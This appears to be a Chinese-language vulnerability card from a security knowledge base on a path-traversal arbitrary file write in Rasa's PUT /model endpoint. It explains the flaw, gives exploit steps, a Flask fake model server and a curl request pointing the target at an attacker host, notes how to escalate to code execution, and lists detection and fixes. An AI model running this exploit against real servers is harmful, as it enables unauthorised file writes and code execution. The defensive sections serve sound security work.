---
id: web-python-framework-rasa-model-server-filename-path-traversal
title: Rasa model_server 响应头 filename 路径穿越任意文件写入
type: scenario
domain: web
path: web/python/framework
technique: model-server-filename-path-traversal
aliases:
- Rasa 任意文件写入
- /model 路径穿越
- model_server filename 穿越
tags:
- python
- rasa
- path-traversal
- arbitrary-file-write
- model-server
- chatbot
- cve-2021-42556
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
affected_versions: Rasa 3.6.21（原文实测）
verification:
  verified_by: verifier-V7
  verified_at: '2026-11-05T00:58:13+08:00'
  notes: CVE 归属已澄清，按技术卡通过；技术链已对照原文与截图 12-22 复核，filename 响应头穿越写入 /app/test.py 成立
---

## 一句话结论

Rasa 的 `PUT /model` 允许调用方指定 `model_server`；服务端拉取模型时直接用 HTTP 响应头 `filename` 拼接临时目录作为保存路径，攻击者控制模型服务器返回 `../../...` 即可向 Rasa 进程可写的任意路径写入任意内容。

## 原理

- `PUT /model` 从请求体读取 `model_file`、`model_server`、`remote_storage`，`model_server` 经 `EndpointConfig.from_dict()` 解析后传给 `_load_agent()`，最终进入 `rasa.core.agent.load_agent()`。
- 当 `model_server` 非空时走 `load_from_server()` → `_update_model_from_server()` → `_pull_model_and_fingerprint()`。
- `_pull_model_and_fingerprint()` 对 `model_server.url` 发起 `GET`（带 `If-None-Match: <fingerprint>`），随后执行：
  ```python
  model_path = Path(model_directory) / resp.headers.get("filename", "model.tar.gz")
  with open(model_path, "wb") as file:
      file.write(await resp.read())
  ```
- `Path(...) / "../../..."` 不会做归一化校验，`..` 会逃出临时目录；文件名完全来自攻击者控制的响应头（非标准的 `filename` 头），响应体也完全可控，因此构成任意路径任意内容写入。
- 写入发生在 `Agent.is_ready()` 检查之前；即使后续因模型不可用返回 400，文件已经落盘，这一点让“只写文件、不管后续加载”的利用方式成立。

## 触发条件

- Rasa 以 `--enable-api` 启动，`/model` 可达。
- 未配置鉴权（未授权），或攻击者持有有效 Token/JWT（有鉴权时）。
- Rasa 进程对目标写入路径有写权限（容器内常见为 `/app`）。
- 攻击者能提供一个可被 Rasa 访问的 HTTP 服务作为伪造的 model server。

## 利用步骤

1. 在攻击机启动伪造模型服务器：对请求返回 200，设置响应头 `filename: ../../app/test.py`，响应体为要写入的内容。
2. 向目标发送 `PUT /model`，`model_server.url` 指向伪造服务器，`wait_time_between_pulls` 设为 0，避免持续轮询。
3. Rasa 拉取响应并按 `../../app/test.py` 保存；返回 400（`Agent with name 'None' could not be loaded`）也不影响文件已写入。
4. 进入容器/主机确认目标文件存在；后续可写入 Python 模块、模板、计划任务等，配合其他加载点达到代码执行。

## PoC

伪造模型服务器（最小示例）：

```python
from flask import Flask, Response

app = Flask(__name__)

@app.get("/stage1")
def stage1():
    return Response("print('stage1 demo hit')\n",
                    headers={"filename": "../../app/test.py"})
```

发起请求：

```bash
curl -X PUT http://target:5005/model \
  -H 'Content-Type: application/json' \
  -d '{"model_server":{"url":"http://attacker:5000/stage1","wait_time_between_pulls":0}}'
```

验证（目标容器内）：

```bash
ls -l /app/test.py
cat /app/test.py
```

## 变体与关联

- 变体：`filename` 可指向任意可写目录；写入 `.py` 模块可配合同一产品的模型加载动态导入链形成 RCE（见 Rasa 模型 metadata 动态导入卡）。
- 变体：伪造服务器可通过 `ETag` 控制是否进入“加载新模型”分支；只做文件写入时无需提供合法模型。
- 关联：`remote_storage`、`model_file` 是同一 `/model` 接口的其他模型来源参数，鉴权与路径校验缺失同源。
- 关联卡片：[[web-python-framework-rasa-model-metadata-importlib-rce]]

## 检测与防御

- 检测：`PUT /model` 请求中出现外部 `model_server.url`；随后 Rasa 进程向该地址发起出站 HTTP 请求。
- 检测：模型临时目录内出现带 `..` 的文件名/异常路径；`/app`、`/tmp` 等目录出现非预期新文件。
- 检测：响应 400 但磁盘出现新文件，属于典型“先写后校验”特征。
- 修复：对下载文件名取 `os.path.basename()` 并拒绝 `..`、绝对路径，写入前 `realpath` 校验必须位于临时目录内；升级到包含修复的版本。
- 加固：`/model` 强制鉴权并限制来源；对 `model_server.url` 做域名/协议白名单，禁止访问任意内网或攻击者地址；Rasa 以低权限、只读根文件系统运行。

## CVE 归属说明

该技术链与 CVE-2021-42556 的实际向量（归档解压目录遍历）不同，卡片不将其作为该 CVE 的复现；CVE 字段已清空，CVE 库不登记该映射。
